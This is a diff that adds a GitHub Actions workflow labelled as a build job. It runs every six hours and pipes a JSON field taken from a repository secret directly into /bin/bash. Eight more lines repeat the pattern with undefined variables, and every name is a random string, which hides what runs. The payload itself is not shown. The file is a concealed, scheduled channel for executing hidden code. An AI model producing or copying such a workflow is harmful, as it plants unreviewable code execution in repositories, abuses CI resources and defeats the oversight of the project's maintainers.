@@ -1,0 +1,26 @@
+name: troubleddreary
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: troubleddreary
+        env:
+          ws1394: ${{ secrets.ws1394 }}
+        run: |
+          echo $ws1394 | jq -r .shw8761 | /bin/bash
+          echo $clf8 | jq -r .dl05 | /bin/bash
+          echo $x6 | jq -r .kcko1 | /bin/bash
+          echo $a72 | jq -r .y683 | /bin/bash
+          echo $huv15 | jq -r .wawce6659 | /bin/bash
+          echo $gy10862 | jq -r .h875 | /bin/bash
+          echo $gu456 | jq -r .lc463 | /bin/bash
+          echo $nx0 | jq -r .ttemy719 | /bin/bash
+          echo $kdc8 | jq -r .gd28672 | /bin/bash
+
